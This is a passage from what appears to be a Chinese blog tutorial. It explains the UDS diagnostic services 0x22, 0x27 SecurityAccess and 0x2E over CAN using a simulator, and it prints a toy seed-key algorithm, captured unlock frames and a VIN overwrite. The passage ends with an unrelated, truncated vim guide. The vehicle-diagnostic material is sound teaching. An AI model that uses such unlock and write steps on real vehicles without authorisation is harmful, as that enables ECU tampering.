<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202407181932537.jpg" alt="1720679085007"></p>
<p>接收到后续的连续帧数据：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202407181932634.jpg" alt="1720679634417"></p>
<p>拼接即得到 VIN(0xF190) 数据：<code>LUAU2AUB3GE383467</code></p>
<p><strong>0x22 服务否定响应数据帧：</strong></p>
<p>使用 cansend 发送一个请求不存在的 DID 的数据：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vcan0  733   [8]  03 22 DE AD 00 00 00 00</span><br><span class="line">vcan0  73B   [8]  03 7F 22 31 00 00 00 00</span><br></pre></td></tr></table></figure>



<p>0x22 服务支持的否定响应代码：</p>
<table>
<thead>
<tr>
<th>NRC</th>
<th>描述</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>0x13</td>
<td>incorrectMessageLengthOrInvalidFormat</td>
<td>消息长度错误</td>
</tr>
<tr>
<td>0x14</td>
<td>responseTooLong</td>
<td>响应消息太长，比如一个请求包含多个DID，超过传输协议允许最大长度</td>
</tr>
<tr>
<td>0x22</td>
<td>conditionsNotCorrect</td>
<td>当前条件不满足</td>
</tr>
<tr>
<td>0x31</td>
<td>requestOutOfRange</td>
<td>请求的DID对当前设备或在当前会话不受支持，参数错误</td>
</tr>
<tr>
<td>0x33</td>
<td>securityAccessDenied</td>
<td>安全访问错误，比如访问的DID数据是安全数据，但当前等级未解锁</td>
</tr>
</tbody></table>
<p>0x22 服务 NRC 处理流程：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202407190936011.png" alt="2h0tgvpm.ofv" style="zoom:67%;" />

<h2 id="0x27-SecurityAccess"><a href="#0x27-SecurityAccess" class="headerlink" title="0x27 SecurityAccess"></a>0x27 SecurityAccess</h2><h3 id="服务简介-2"><a href="#服务简介-2" class="headerlink" title="服务简介"></a>服务简介</h3><p>安全访问，SID：0x27</p>
<p>该服务内容详解：<del><a href="https://blog.csdn.net/qq_40309666/article/details/133753204?spm=1001.2014.3001.5501">《UDS协议从入门到精通》系列——图解0x27：安全访问</a></del></p>
<p>对应 ISO-14229-1 页码：47</p>
<ul>
<li>ECU 中某些重要数据会受到安全保护，对其进行读或写操作时需要先申请安全访问，解锁对应的安全等级后才能进行后续操作</li>
<li>例如在通过 0x2E 服务对指定 DID 进行写操作时，或通过0x34 服务进行请求下载操作时通常需要安全解锁</li>
</ul>
<p>工作流程（摘自👆详解）：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202407191048711.png" alt="dhexdyjl.hcw" style="zoom:67%;" />

<p>该服务支持 sub-function</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202407201640190.png" alt="pxlvb4pe.cwp" style="zoom:67%;" />

<h3 id="请求-响应数据包分析-2"><a href="#请求-响应数据包分析-2" class="headerlink" title="请求 &#x2F; 响应数据包分析"></a>请求 &#x2F; 响应数据包分析</h3><blockquote>
<p>本实验采用的模拟器自行定义了 03, 19, 21 三个 安全等级，以下是各等级的限制（这几个安全等级均为自行定义）：</p>
<ul>
<li>安全等级 03：读数据无需安全访问，写数据需要安全访问（fake key，固定key：<code>deadbeef</code>）</li>
<li>安全等级 19：读数据无需安全访问，写数据需要安全访问</li>
<li>安全等级 21：读写数据均需要安全访问</li>
</ul>
<p>所使用的 key 生成算法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint8_t</span> *<span class="title function_">security_algorithm</span><span class="params">(<span class="type">uint8_t</span> *seed_ptr)</span> &#123;</span><br><span class="line">	<span class="type">uint8_t</span> *key_ptr = (<span class="type">uint8_t</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">uint8_t</span>)*<span class="number">4</span>);</span><br><span class="line">    <span class="type">uint8_t</span> Seed[<span class="number">4</span>];</span><br><span class="line">    <span class="type">uint8_t</span> Const[<span class="number">4</span>];</span><br><span class="line">    <span class="type">uint8_t</span> Key[<span class="number">4</span>];</span><br><span class="line">    <span class="type">uint32_t</span> wConst = <span class="number">0xdeadbeef</span>;</span><br><span class="line"></span><br><span class="line">    Seed[<span class="number">0</span>] = *seed_ptr;</span><br><span class="line">    Seed[<span class="number">1</span>] = *(seed_ptr+<span class="number">1</span>);</span><br><span class="line">    Seed[<span class="number">2</span>] = *(seed_ptr+<span class="number">2</span>);</span><br><span class="line">    Seed[<span class="number">3</span>] = *(seed_ptr+<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    Const[<span class="number">3</span>] = (<span class="type">uint8_t</span>)((wConst &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">    Const[<span class="number">2</span>] = (<span class="type">uint8_t</span>)((wConst &amp; <span class="number">0x00ff0000</span>) &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    Const[<span class="number">1</span>] = (<span class="type">uint8_t</span>)((wConst &amp; <span class="number">0x0000ff00</span>) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    Const[<span class="number">0</span>] = (<span class="type">uint8_t</span>)(wConst &amp; <span class="number">0x000000ff</span>);</span><br><span class="line"></span><br><span class="line">    Key[<span class="number">0</span>] = Const[<span class="number">0</span>] * (Seed[<span class="number">0</span>] * Seed[<span class="number">0</span>]) + Const[<span class="number">1</span>] * (Seed[<span class="number">1</span>] * Seed[<span class="number">1</span>]) + Const[<span class="number">2</span>] * (Seed[<span class="number">0</span>] * Seed[<span class="number">1</span>]);</span><br><span class="line">    Key[<span class="number">1</span>] = Const[<span class="number">0</span>] * (Seed[<span class="number">0</span>]) + Const[<span class="number">1</span>] * (Seed[<span class="number">1</span>]) + Const[<span class="number">3</span>] * (Seed[<span class="number">0</span>] * Seed[<span class="number">1</span>]);</span><br><span class="line">    Key[<span class="number">2</span>] = Const[<span class="number">0</span>] * (Seed[<span class="number">2</span>] * Seed[<span class="number">3</span>]) + Const[<span class="number">1</span>] * (Seed[<span class="number">3</span>] * Seed[<span class="number">3</span>]) + Const[<span class="number">2</span>] * (Seed[<span class="number">2</span>] * Seed[<span class="number">3</span>]);</span><br><span class="line">    Key[<span class="number">3</span>] = Const[<span class="number">0</span>] * (Seed[<span class="number">2</span>] * Seed[<span class="number">3</span>]) + Const[<span class="number">1</span>] * (Seed[<span class="number">3</span>]) + Const[<span class="number">3</span>] * (Seed[<span class="number">2</span>] * Seed[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    key_ptr = Key;</span><br><span class="line">    <span class="keyword">return</span> key_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>接下来使用安全等级 21 进行演示，捕获到的 can 报文如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">请求切换到扩展会话模式</span></span><br><span class="line">[TX] 733 [8] 0210030000000000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确认切换到扩展会话模式</span></span><br><span class="line">[RX] 73b [8] 065003003201f400</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Security Access</span></span><br><span class="line">[TX] 733 [8] 0227210000000000</span><br><span class="line">[RX] 73b [8] 0667213071940900</span><br><span class="line">[TX] 733 [8] 0627226e4ece5200</span><br><span class="line">[RX] 73b [8] 0267220000000000</span><br></pre></td></tr></table></figure>

<p><strong>0x27 服务请求数据帧：</strong></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202407201640080.jpg" alt="1720749947508"></p>
<p>请求种子（seedRequest）请求中，SID 后一字节数据为奇数，代表对应的安全等级，securityAccessDataRecord 一般不使用</p>
<p>发送密钥（sendKey）请求中，SID 后一字节数据为偶数，其值为目标的安全等级+1</p>
<p><strong>0x27 服务肯定响应数据帧：</strong></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202407201641552.jpg" alt="1720750212050"></p>
<p>大多情况下肯定响应帧只有 0x67 和 Sub-Function，只有在请求种子的响应中会携带 securitySeed 数据</p>
<p><strong>0x27 服务否定响应数据帧：</strong></p>
<p>发送一个错误的密钥进行否定响应演示，捕获到的 CAN 数据如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[TX] 733 [8] 0210030000000000</span><br><span class="line">[RX] 73b [8] 065003003201f400</span><br><span class="line">[TX] 733 [8] 0227210000000000</span><br><span class="line">[RX] 73b [8] 0667216151303900</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发送错误的密钥</span></span><br><span class="line">[TX] 733 [8] 062722deadbeef00</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">得到否定响应</span></span><br><span class="line">[RX] 73b [8] 037f273500000000</span><br></pre></td></tr></table></figure>

<p>0x27 服务支持的否定响应代码：</p>
<table>
<thead>
<tr>
<th>NRC</th>
<th>描述</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>0x12</td>
<td>sub-functionNotSupported</td>
<td>子功能参数不受支持</td>
</tr>
<tr>
<td>0x13</td>
<td>incorrectMessageLengthOrInvalidFormat</td>
<td>消息长度错误</td>
</tr>
<tr>
<td>0x22</td>
<td>conditionsNotCorrect</td>
<td>不满足请求标准&#x2F;条件</td>
</tr>
<tr>
<td>0x24</td>
<td>requestSequenceError</td>
<td>请求顺序错误，比如应该先发送请求种子，而不是先发送密钥数据</td>
</tr>
<tr>
<td>0x31</td>
<td>requestOutOfRange</td>
<td>请求中携带的数据是无效的</td>
</tr>
<tr>
<td>0x35</td>
<td>invalidKey</td>
<td>密钥不匹配，即Tester计算出来的key和目标ECU计算出来的不一样：若始终不匹配还不断尝试，ECU会回复下面的NRC&#x3D;36，告诉你已经超过失败的次数了，不能再请求安全解锁了</td>
</tr>
<tr>
<td>0x36</td>
<td>exceededNumberOfAttempts</td>
<td>超过最大试错次数，已达到解锁最大错误次数，若你执意再请求，ECU就会回复你下面的NRC&#x3D;37,意思是ECU现在不接受安全访问，这就是ECU锁死的现象，需等待一定时间后才可继续请求安全访问</td>
</tr>
<tr>
<td>0x37</td>
<td>requiredTimeDelayNotExpired</td>
<td>当前服务器处于延时状态，超时时间未到</td>
</tr>
</tbody></table>
<blockquote>
<p>未额外声明时，当前服务的上述 NRC 在 UDS 模拟器中均可支持</p>
</blockquote>
<h2 id="0x2E-WriteDatabyIdentifier"><a href="#0x2E-WriteDatabyIdentifier" class="headerlink" title="0x2E WriteDatabyIdentifier"></a>0x2E WriteDatabyIdentifier</h2><h3 id="服务简介-3"><a href="#服务简介-3" class="headerlink" title="服务简介"></a>服务简介</h3><p>通过 ID 写数据，SID：0x2E</p>
<p>该服务内容详解：<a href="https://blog.csdn.net/qq_40309666/article/details/133888945?spm=1001.2014.3001.5501">《UDS协议从入门到精通》系列——图解0x2E：通过ID写数据</a></p>
<p>对应 ISO-14229-1 页码：162</p>
<p>本服务不支持 sub-function，且不支持一次性写多个 DID</p>
<h3 id="请求-响应数据包分析-3"><a href="#请求-响应数据包分析-3" class="headerlink" title="请求 &#x2F; 响应数据包分析"></a>请求 &#x2F; 响应数据包分析</h3><blockquote>
<p>UDS 模拟器的配置文件中声明了可用的 DID，接下来使用默认 TBOX 配置中的 DID 0xF190（VIN码） 作为目标 DID 进行演示（安全等级 19）</p>
</blockquote>
<p>发送请求：请求读取 F190 数据，然后请求写 F190 数据（写入 <code>Hello world</code>），最后请求读 F190 数据，捕获到的 CAN 数据包如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">请求切换到扩展会话模式</span></span><br><span class="line">[TX] 733 [8] 0210030000000000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确认切换到扩展会话模式</span></span><br><span class="line">[RX] 73b [8] 065003003201f400</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">请求读取 DID 为 F190 的数据</span></span><br><span class="line">[TX] 733 [8] 0322f19000000000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回数据</span></span><br><span class="line">[RX] 73b [8] 101462f1904c5541</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">流控帧</span></span><br><span class="line">[TX] 733 [8] 3000000000000000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回数据</span></span><br><span class="line">[RX] 73b [8] 2155324155423347</span><br><span class="line">[RX] 73b [8] 2245333833343637</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安全访问请求</span></span><br><span class="line">[TX] 733 [8] 0227190000000000</span><br><span class="line">[RX] 73b [8] 0667193625349200</span><br><span class="line">[TX] 733 [8] 06271aa084d8e400</span><br><span class="line">[RX] 73b [8] 02671a0000000000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">WriteDatabyIdentifier:</span></span><br><span class="line">[TX] 733 [8] 100e2ef19048656c</span><br><span class="line">[RX] 73b [8] 30000f0000000000</span><br><span class="line">[TX] 733 [8] 216c6f20776f726c</span><br><span class="line">[TX] 733 [8] 2264000000000000</span><br><span class="line">[RX] 73b [8] 036ef19000000000</span><br><span class="line">[TX] 733 [8] 0322f19000000000</span><br><span class="line">[RX] 73b [8] 100e62f19048656c</span><br><span class="line">[TX] 733 [8] 3000000000000000</span><br><span class="line">[RX] 73b [8] 216c6f20776f726c</span><br><span class="line">[RX] 73b [8] 2264000000000000</span><br></pre></td></tr></table></figure>

<p><strong>0x2E 服务请求数据帧：</strong></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202407211021909.png" alt="qbnen5dn.ens"></p>
<p><strong>0x2E 服务肯定响应数据帧：</strong></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202407211021717.jpg" alt="1720767745805"></p>
<p><strong>0x2E 服务否定响应数据帧：</strong></p>
<p>尝试请求写一个安全等级尚未解锁的目标 DID：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[TX] 733 [8] 0210030000000000</span><br><span class="line">[RX] 73b [8] 065003003201f400</span><br><span class="line">[TX] 733 [8] 100e2efa1948656c</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返回否定响应</span></span><br><span class="line">[RX] 73b [8] 037f2e3300000000</span><br></pre></td></tr></table></figure>

<p>0x2E 服务支持的否定响应代码：</p>
<table>
<thead>
<tr>
<th>NRC</th>
<th>描述</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>0x13</td>
<td>incorrectMessageLengthOrInvalidFormat</td>
<td>消息长度错误</td>
</tr>
<tr>
<td>0x22</td>
<td>conditionsNotCorrect</td>
<td>当前条件不满足</td>
</tr>
<tr>
<td>0x31</td>
<td>requestOutOfRange</td>
<td>请求参数不受支持，参数错误</td>
</tr>
<tr>
<td>0x33</td>
<td>securityAccessDenied</td>
<td>安全访问错误，比如访问的DID数据是安全数据，但当前等级未解锁</td>
</tr>
<tr>
<td>0x72</td>
<td>generalProgrammingFailure</td>
<td>通用编程错误，一般写入内存出错就报这个NRC</td>
</tr>
</tbody></table>
<blockquote>
<p>UDS 模拟器暂不支持 NRC 0x72</p>
</blockquote>
<p>0x2E 服务 NRC 处理流程：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture202407211021065.png" alt="vjp1uiyv.2z3" style="zoom:67%;" />



<h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>0x34, 0x35, 0x36, 0x37 服务</p>
]]></content>
      <categories>
        <category>IoV</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
        <tag>IoV</tag>
      </tags>
  </entry>
  <entry>
    <title>vim 配置与使用</title>
    <url>/2023/07/16/vim/</url>
    <content><![CDATA[<h1 id="Vim-的使用"><a href="#Vim-的使用" class="headerlink" title="Vim 的使用"></a>Vim 的使用</h1><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/vi-vim-cheat-sheet-sch.gif" alt="vi-vim-cheat-sheet-sch"></p>
<p>至于 vim 是什么就无需多做介绍了, 直接进入使用说明好了：</p>
<p>最基本的操作 – 使用 vim 打开一个指定的文件[doge]: <code>vim filepath</code></p>
<details class="note default"><summary><p>其他基本用不着的打开文件操作</p>
</summary>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打开指定文件，并将光标移动到指定行(eg. 5)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim +5 filepath</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打开指定文件，并高亮显示关键词(eg. keyword)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim +/keyword filepath</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打开多个文件</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim filepath1 filepath2 filepath3</span></span><br></pre></td></tr></table></figure>
</details>

<p>当然如果只是想简单用一下 vim 编辑一丢丢内容，那么只需要知道以下操作即可：</p>
<ol>
<li><code>vim filepath</code> 打开目标文件</li>
<li>按 <code>i</code> 键</li>
<li>开始编辑</li>
<li>编辑完成按 <code>ESC</code></li>
<li>敲 <code>:wq</code> 或者按两下 <code>Z</code> 键 (Shift + z) 保存退出</li>
</ol>
<p>如果想学习一下 vim 的使用:</p>
<blockquote>
<p>Vim 学习资料：</p>
<ul>
<li>vimtutor 👉 vim 安装后自带的教程</li>
<li>📘 <a href="https://missing-semester-cn.github.io/2020/editors/">missing-semester</a></li>
<li>🔗 <a href="https://danielmiessler.com/study/vim/">https://danielmiessler.com/study/vim/</a></li>
</ul>
</blockquote>
<h2 id="Vim-Mode"><a href="#Vim-Mode" class="headerlink" title="Vim Mode"></a>Vim Mode</h2><p>首先是介绍 Vim 的四种基本的模式，以及在各个模式下比较常用的一些操作</p>
<h3 id="Normal-Mode"><a href="#Normal-Mode" class="headerlink" title="Normal Mode"></a>Normal Mode</h3><ul>
<li>vim 的默认模式，使用 vim 打开文件之后默认进入的就是这个模式</li>
<li>在这个模式下不能像 Sublime、VSCode 那样直接对文件进行编辑操作，但可以通过快捷键进行编辑(比如删除行、复制行、删除单个字符、移动光标、粘贴等)</li>
<li>另外如果要切换到其他模式，都需要先回到 Normal Mode</li>
</ul>
<h4 id="Normal-Mode-常用操作"><a href="#Normal-Mode-常用操作" class="headerlink" title="Normal Mode 常用操作"></a>Normal Mode 常用操作</h4><blockquote>
<p>后面所有 <code>Ctrl + </code> 的组合键都用vim配置文件中的形式表示，即 <code>&lt;C-...&gt;</code> 【大小写不敏感】</p>
</blockquote>
<table>
<thead>
<tr>
<th>光标移动</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>h</code></td>
<td>往左移动</td>
</tr>
<tr>
<td><code>j</code></td>
<td>往下移动</td>
</tr>
<tr>
<td><code>k</code></td>
<td>往上移动</td>
</tr>
<tr>
<td><code>l</code></td>
<td>往右移动</td>
</tr>
<tr>
<td><code>gg</code></td>
<td>移动到首行</td>
</tr>
<tr>
<td><code>G</code></td>
<td>移动到尾行</td>
</tr>
<tr>
<td><code>mG</code></td>
<td>移动到第m行(这里m代指一个数字)</td>
</tr>
<tr>
<td><code>0</code></td>
<td>到行首</td>
</tr>
<tr>
<td><code>^</code></td>
<td>到行首第一个非空白字符</td>
</tr>
<tr>
<td><code>$</code></td>
<td>到行末尾</td>
</tr>
<tr>
<td><code>w</code></td>
<td>移动到下一个单词起始处</td>
</tr>
<tr>
<td><code>b</code></td>
<td>移动到上一个单词起始处</td>
</tr>
<tr>
<td><code>f&lt;</code></td>
<td>跳转到目标字符处(这里是&lt;)</td>
</tr>
<tr>
<td><code>&lt;C+f&gt;</code></td>
<td>向下翻屏</td>
</tr>
<tr>
<td><code>&lt;C+b&gt;</code></td>
<td>向上翻屏</td>
</tr>
<tr>
<td><code>&lt;C+u&gt;</code></td>
<td>向下翻半屏</td>
</tr>
<tr>
<td><code>&lt;C+d&gt;</code></td>
<td>向上翻半屏</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>分屏操作</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>&lt;C+w&gt; s</code></td>
<td>上下分割，打开当前文件</td>
</tr>
<tr>
<td><code>:sp filepath</code></td>
<td>上下分割，打开新文件(Command Line Mode)</td>
</tr>
<tr>
<td><code>&lt;C+w&gt; v</code></td>
<td>左右分割，打开当前文件</td>
</tr>
<tr>
<td><code>:vsp filepath</code></td>
<td>左右分割，打开新文件(Command Line Mode)</td>
</tr>
<tr>
<td><code>&lt;C+w&gt; h</code></td>
<td>切换到左边的窗口</td>
</tr>
<tr>
<td><code>&lt;C+w&gt; j</code></td>
<td>切换到下边的窗口</td>
</tr>
<tr>
<td><code>&lt;C+w&gt; k</code></td>
<td>切换到上边的窗口</td>
</tr>
<tr>
<td><code>&lt;C+w&gt; l</code></td>
<td>切换到右边的窗口</td>
</tr>
<tr>
<td><code>&lt;C+w&gt; w</code></td>
<td>切换到下一个窗口</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>基本操作</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>y</code></td>
<td>复制选中的内容</td>
</tr>
<tr>
<td><code>yn</code></td>
<td>复制包括当前行在内往下n行的内容(这里n代指数字)</td>
</tr>
<tr>
<td><code>yip</code></td>
<td>复制当前段落内容</td>
</tr>
<tr>
<td><code>yy</code></td>
<td>复制当前行</td>
</tr>
<tr>
<td><code>p</code></td>
<td>粘贴到光标后</td>
</tr>
<tr>
<td><code>P</code></td>
<td>粘贴到光标前</td>
</tr>
<tr>
<td><code>x</code></td>
<td>删除光标所在的字符</td>
</tr>
<tr>
<td><code>dd</code></td>
<td>删除当前行</td>
</tr>
<tr>
<td><code>dn</code></td>
<td>删除包括当前行在内往下n行的内容(这里n代指数字)</td>
</tr>
<tr>
<td><code>dw</code></td>
<td>删除从光标所在位置开始的一个单词</td>
</tr>
<tr>
<td><code>D</code></td>
<td>删除从光标所在位置开始到行末尾的内容</td>
</tr>
<tr>
<td><code>u</code></td>
<td>undo</td>
</tr>
<tr>
<td><code>&lt;C+r&gt;</code></td>
<td>redo</td>
</tr>
<tr>
<td><code>.</code></td>
<td>重复上一次操作</td>
</tr>
<tr>
<td><code>ZZ</code></td>
<td>保存并退出(大写Z)</td>
</tr>
</tbody></table>
<details class="note default"><summary><p>不常用的折叠代码块操作</p>
</summary>
<table>
<thead>
<tr>
<th>折叠操作</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>zc</code></td>
<td>折叠代码块</td>
</tr>
<tr>
<td><code>zo</code></td>
<td>打开折叠</td>
</tr>
<tr>
<td><code>zr</code></td>
<td>展开所有折叠</td>
</tr>
<tr>
<td><code>za</code></td>
<td>打开&#x2F;关闭折叠</td>
</tr>
<tr>
<td><code>zn</code></td>
<td>禁用折叠</td>
</tr>
<tr>
<td><code>zN</code></td>
<td>启用折叠</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:set foldmethod = indent   # 用缩进表示折叠，适用于Python</span><br><span class="line">:set foldmethod = syntax   # 根据语法进行折叠</span><br></pre></td></tr></table></figure>

<ul>
<li>详细的说明可以直接查文档: <code>:help folding</code></li>
</ul>

</details>

<h3 id="Insert-Mode"><a href="#Insert-Mode" class="headerlink" title="Insert Mode"></a>Insert Mode</h3><ul>
<li>在这个模式下可以直接对文件内容进行编辑<ul>
<li>进入方式: 在 Normal Mode 下按 <code>i</code> 进入 Insert Mode<ul>
<li>这里的 <code>i</code> 实际上是指在当前光标之前插入文本，其实还有一些常用的进入 Insert Mode 的按键:<ul>
<li>用 <code>a</code> 也可进入 Insert Mode，这里则是在光标之后插入文本</li>
<li>用 <code>o</code> (小写字母o)是在当前行下方插入新的一行并进入 Insert Mode</li>
<li>用 <code>O</code> (大写字母O)是在当前行上方插入新的一行并进入 Insert Mode</li>
<li>用 <code>S</code> 是删除掉当前行并进入 Insert Mode</li>
<li>用 <code>C</code> 是删除从当前位置到行尾的字符并进入 Insert Mode</li>
</ul>
</li>
<li>还有很多进入 Insert Mode 的方式，可以使用 <code>:help inserting</code> 查询</li>
</ul>
</li>
<li>退出方式：在 Insert Mode 下按 <code>ESC</code> 即可切换回 Normal Mode<ul>
<li>同样退出方式也有多种，<code>ESC</code> 只是其中一个<ul>
<li><code>&lt;C-c&gt;</code> 也是可以的</li>
<li><code>&lt;C-[&gt;</code> 也可，效果跟 <code>ESC</code> 一样</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Command-Line-Mode"><a href="#Command-Line-Mode" class="headerlink" title="Command Line Mode"></a>Command Line Mode</h3><ul>
<li>在这个模式下可以在末行输入命令来对文件进行一系列操作(搜索、高亮、替换、保存、退出等等)<ul>
<li>前面提到的使用 <code>:help xxxx</code> 查询就是在这个模式下执行的</li>
<li>进入方式:<ul>
<li>在 Normal Mode 下按下 <code>:</code> 键即可进入 Command Line Mode，在末行也可以看到输入的这个 <code>:</code></li>
</ul>
</li>
<li>退出方式：<ul>
<li>命令执行完自动会返回到 Normal Mode</li>
<li>不想执行已经键入的内容也可直接 <code>&lt;C-c&gt;</code> 返回到 Normal Mode</li>
</ul>
</li>
</ul>
</li>
<li>如果想要搜索内容，则可在 Normal Mode 下按 <code>/</code> 键（逆向搜索的话是 <code>?</code>），然后输入 search pattern 回车即可搜索<ul>
<li>光标会定位到搜索结果处，如果有多个，可按 <code>n</code> 键跳转到下一个匹配项，按 <code>N</code> 跳转到上一个匹配项</li>
</ul>
</li>
</ul>
<h3 id="Command-Line-Mode-常用操作"><a href="#Command-Line-Mode-常用操作" class="headerlink" title="Command Line Mode 常用操作"></a>Command Line Mode 常用操作</h3><table>
<thead>
<tr>
<th>基本操作</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>:w</code></td>
<td>保存</td>
</tr>
<tr>
<td><code>:wq</code></td>
<td>保存并退出</td>
</tr>
<tr>
<td><code>:q!</code></td>
<td>不保存强制退出</td>
</tr>
<tr>
<td><code>:e filepath</code></td>
<td>打开文件 (在当前窗口打开)</td>
</tr>
<tr>
<td><code>:bn</code></td>
<td>切换缓冲区下一个文件(打开多个文件时)</td>
</tr>
<tr>
<td><code>:bp</code></td>
<td>切换缓冲区上一个文件(打开多个文件时)</td>
</tr>
<tr>
<td><code>:tab filepath</code></td>
<td>在新标签页打开文件</td>
</tr>
<tr>
<td><code>:noh</code></td>
<td>取消搜索匹配的高亮显示</td>
</tr>
<tr>
<td><code>:!</code></td>
<td>执行系统命令</td>
</tr>
<tr>
<td><code>:s</code></td>
<td>替换文本</td>
</tr>
</tbody></table>
<ul>
<li>在 Command Line Mode 下可以执行命令进行一些复杂操作<ul>
<li>例如要将当前行中的 <code>abc</code> 替换成 <code>efg</code>：<ul>
<li><code>:s/abc/efg/g</code> 这里末尾的 <code>g</code> 表示所有匹配项都要替换，如果要忽略大小写则是指定 <code>i</code></li>
</ul>
</li>
</ul>
</li>
<li>更多的命令查文档学习即可(😅别的也不会了，这些暂时也够用了)</li>
</ul>
<h4 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h4><ul>
<li>在默认情况下，像 <code>:d</code>，<code>:y</code>，<code>:s</code> 这样的命令都是作用在当前行上, <code>:w</code> 这样的命令是作用在整个文件上，其实可以通过使用 range 来指定命令的作用域。</li>
<li>详细的说明: <code>:help range</code></li>
<li>这里就随便举几个常用的例子好了: <ul>
<li>例如要删除第3行到第5行的数据: <code>:3,5d</code></li>
<li>例如要复制第6行到最后一行的数据: <code>:6,$y</code>, 这里 <code>$</code> 代表末行</li>
<li>例如要从整个文件中将所有的 <code>abc</code> 替换成 <code>efg</code>: <code>:%s/abc/efg/g</code>, 这里 <code>%</code> 代表所有行</li>
<li>例如要在第3行到第6行头部添加注释符 <code>// </code>: <code>:3,6 normal i// </code></li>
</ul>
</li>
</ul>
<h3 id="Visual-Mode"><a href="#Visual-Mode" class="headerlink" title="Visual Mode"></a>Visual Mode</h3><ul>
<li>在这个模式下可以选择需要操作的文本, 在批量注释的时候能用到<ul>
<li>进入方法：<ul>
<li>Character mode: <code>v</code> (小写v)</li>
<li>Line mode: <code>V</code> (大写V)</li>
<li>Block mode: <code>Ctrl + v</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="三种模式的对比"><a href="#三种模式的对比" class="headerlink" title="三种模式的对比"></a>三种模式的对比</h4><p>直接看图体会吧:</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/vim-virtualmode.gif" alt="vim-virtualmode" style="zoom:50%;" />

<ul>
<li>选好要操作的区域之后按 <code>:</code> 进入 Command Line Mode 继续进行命令操作</li>
</ul>
<h1 id="打造一个适合自己的-vim"><a href="#打造一个适合自己的-vim" class="headerlink" title="打造一个适合自己的 vim"></a>打造一个适合自己的 vim</h1><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230717211652454.png" alt="image-20230717211652454" style="zoom:50%;" />

<p>vim 是可以整出❀来的，各种插件主题安排上，可以打造出一个用起来很爽的 IDE，如果自己懒得折腾，也可以直接上 <a href="https://github.com/chxuan/vimplus">vimplus</a>；如果想自己折腾，那这里推荐一些好用的插件：</p>
<h2 id="插件-主题推荐"><a href="#插件-主题推荐" class="headerlink" title="插件&#x2F;主题推荐"></a>插件&#x2F;主题推荐</h2><ul>
<li>首先第一步，装 vim 的插件管理器 👉 <a href="https://github.com/junegunn/vim-plug">vim-plug</a><ul>
<li>一个非常轻量化的插件管理器</li>
